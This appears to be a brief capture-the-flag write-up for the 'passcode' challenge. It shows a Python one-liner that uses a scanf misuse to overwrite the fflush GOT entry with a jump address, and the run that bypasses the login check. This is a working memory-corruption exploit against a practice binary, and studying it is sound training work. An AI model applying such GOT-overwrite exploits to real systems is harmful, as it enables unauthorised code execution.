# passcode

---

<img width="1440" alt="Screenshot 2024-12-11 at 11 07 53 PM" src="https://github.com/user-attachments/assets/37ccd366-5ecd-4123-a091-159a5498d034" />

---

#### what to write>>: 0x080485e3: 134514147

#### where to write >> 0804a004  00000207 R_386_JUMP_SLOT   00000000   
fflush@GLIBC_2.0

```python
python -c "print 'a'*96 + '\x04\xa0\x04\x08\n134514147\n10\n'" > tmp/test
```

```bash
python -c "print 'a'*96 + '\x04\xa0\x04\x08\n134514147\n10\n'" > /tmp/test
channel 21: open failed: administratively prohibited: open failed
ls
flag  passcode	passcode.c
channel 26: open failed: administratively prohibited: open failed
./passcode < /tmp/test
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```

---
